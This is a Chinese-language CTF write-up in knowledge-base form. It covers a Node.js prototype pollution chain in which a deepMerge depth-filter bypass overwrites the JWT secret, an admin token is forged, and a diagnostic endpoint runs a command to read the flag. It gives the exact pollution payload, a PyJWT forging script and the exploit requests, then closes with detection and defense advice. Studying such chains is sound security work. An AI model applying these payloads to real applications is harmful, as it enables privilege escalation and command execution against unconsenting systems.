---
id: web-nodejs-prototype-pollution-deepmerge-depth-jwt-secret
title: 原型链污染污染 JWT 密钥：deepMerge depth 绕过 → 伪造 admin token → 诊断接口执行
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: prototype-pollution-deepmerge-depth-jwt-secret
tags:
- nodejs
- prototype-pollution
- deepmerge
- jwt
- privilege-escalation
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V111
  verified_at: '2026-11-06T01:45:51+08:00'
  notes: 已对照 CorpGate 原文与图片核对：merge.js 的 depth<3 才拦截 constructor/prototype、POST /api/settings 调用 deepMerge、污染响应 pending=123456、jwt.io 用 secret 123456 伪造 role=admin、diagnostic.js execSync('/readflag')、/api/reports/execute 返回 flag 均与原文一致。一句话中“四层嵌套”为不精确表述（payload 为 5 层对象嵌套后到 pending），但 payload 本身正确可复现；PoC 未本机执行
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-deepmerge-depth-jwt-secret/
draft: false
kb_aliases:
- CorpGate
- deepMerge depth 绕过
- constructor.prototype.pending
- 污染 JWT secret
- 原型链污染伪造 admin
- /api/reports/execute
---

## 一句话结论

`deepMerge` 只在 `depth < 3` 时拦截 `constructor`/`prototype` 等键，攻击者用四层嵌套 `{"notifications":{"digest":{"channels":{"constructor":{"prototype":{"pending":"123456"}}}}}}` 把 `Object.prototype.pending` 污染成 `123456`；JWT 密钥正好取自该配置对象，于是可以用 `123456` 伪造 `role=admin` 的 token，进入管理后台并调用 `/api/reports/execute` 触发 `execSync('/readflag')`。

## 原理

- 原型链污染：`deepMerge(target, source)` 递归合并对象时，若允许 `__proto__`/`constructor`/`prototype` 等键，就会写入 `Object.prototype`，使所有对象继承被污染属性。
- 过滤缺陷：代码 `if (depth < 3 && BLOCKED_ROOTS.includes(key)) continue;` 只在前三层拦截；当嵌套深度 `>= 3` 时，`constructor`/`prototype` 不再被过滤，递归到 `prototype` 下的 `pending` 即写入 `Object.prototype.pending`。
- 应用把 JWT secret 从配置对象读取（如 `config.pending` 或 `settings.pending`）；由于 `Object.prototype.pending` 被污染，所有没有自有 `pending` 属性的对象都会“继承”该值，JWT 签名/校验密钥变成攻击者可控的 `123456`。
- 攻击者用 `123456` 对任意 payload（如 `{"id":"...","username":"admin","role":"admin",...}`）重新签 HS256 token；服务端用被污染的 secret 校验通过，获得 admin 权限。
- 管理后台的 `/api/reports/execute` 接收 `reference`，命中 `diagnosticStore` 后执行 `execSync('/readflag')` 并把输出返回；因此从原型污染到命令执行/flag 读取形成完整链。
- 关键点：污染必须发生在 JWT 校验/签发之前，且 secret 读取路径要能被原型链命中；本例 `/api/settings` 的 `deepMerge` 正好在登录后、访问 admin 前可调用。

## 触发条件

- Node.js/Express 应用使用递归 `deepMerge` 合并用户可控 JSON，且过滤只覆盖部分深度/键名。
- JWT secret 从普通对象/配置读取，未使用 `Object.create(null)` 或独立环境变量。
- 攻击者能注册/登录普通账号，访问可触发 `deepMerge` 的接口（如 `/api/settings`）。
- 存在 admin 专属接口/命令执行点（如诊断报告）可用于验证权限提升。

## 利用步骤

1. 注册并登录普通账号，拿到自己的 JWT 与 `id/username/role`。
2. 找到调用 `deepMerge` 的接口（案例 `POST /api/settings`），构造四层嵌套 payload：
   `{"notifications":{"digest":{"channels":{"constructor":{"prototype":{"pending":"123456"}}}}}}`。
3. 发送后检查响应/后续行为，确认 `Object.prototype.pending` 被污染（如 JWT secret 变为 `123456`）。
4. 用 `123456` 作为 HS256 secret，重新签一个 `role=admin` 的 token（保持合法 `id/username`，修改 role）。
5. 携带伪造 token 访问 `/admin`/`/dashboard`，确认角色为 admin；访问 `/api/system/healthcheck` 触发配置刷新（如需要）。
6. 从 admin 面板获取 `Report Reference`，调用 `POST /api/reports/execute`，body `{"reference":"<ref>"}`，读取 `report` 中的 flag/命令输出。
7. 若 secret 不是 `pending`，枚举其他被污染键/读取路径，或污染 `config` 上实际使用的字段。

## PoC

```json
POST /api/settings HTTP/1.1
Host: target
Cookie: token=<normal-user-jwt>
Content-Type: application/json

{
  "notifications": {
    "digest": {
      "channels": {
        "constructor": {
          "prototype": {
            "pending": "123456"
          }
        }
      }
    }
  }
}
```

```python
import jwt  # PyJWT

payload = {
    "id": "773b3313-679c-493d-8c8e-3f0db04834a4",
    "username": "admin",
    "role": "admin",
    "iat": 1780135357,
    "exp": 1780221757,
}
token = jwt.encode(payload, "123456", algorithm="HS256")
print(token)
```

```http
POST /api/reports/execute HTTP/1.1
Host: target
Cookie: token=<forged-admin-jwt>
Content-Type: application/json

{"reference":"1ba6356bfe5e67a6f3ccc651eb438a8c"}
```

案例响应：`{"status":"completed","report":"DASCTF{8e76030a-ebab-4ae6-8dd0-29b20211afbd}"}`。

## 变体与关联

- 变体：过滤只在顶层/前两层生效时，用更深嵌套或 `constructor.prototype`、`__proto__` 的 JSON/表单差异绕过。
- 变体：污染目标不一定是 JWT secret，也可能是 `isAdmin`、`role`、`featureFlags`、模板变量、命令参数等；按应用读取路径选择。
- 变体：`Object.prototype` 被污染后，`config.pending`、`user.pending`、`settings.pending` 都可能命中；可先污染一个可观测字段做验证。
- 关联：[[web-nodejs-prototype-pollution-filter-bypass]]（过滤绕过）、[[web-nodejs-prototype-pollution-merge-json-parse]]（merge 深合并）、[[web-generic-jwt-example-config-hardcoded-secret]]（JWT 弱密钥伪造）。

## 检测与防御

- 防御：合并用户输入时使用 `Object.create(null)`/`Map`，在任何深度都拒绝 `__proto__`、`constructor`、`prototype`；对 JSON 做 schema 白名单。
- 防御：JWT secret 从环境变量/密钥管理读取，不要放在可被原型链继承的普通配置对象；启动时 `Object.freeze(Object.prototype)`。
- 防御：管理接口做服务端角色校验，不要只依赖 JWT 中的 role；命令执行点使用白名单/参数化。
- 检测：请求体中出现深层 `constructor`/`prototype`/`__proto__`；JWT secret/角色异常变化；普通用户访问 admin/诊断接口。
- 响应：发现污染后重启进程清除原型链、轮换 JWT secret、审计被污染期间签发的 token 与命令执行记录。
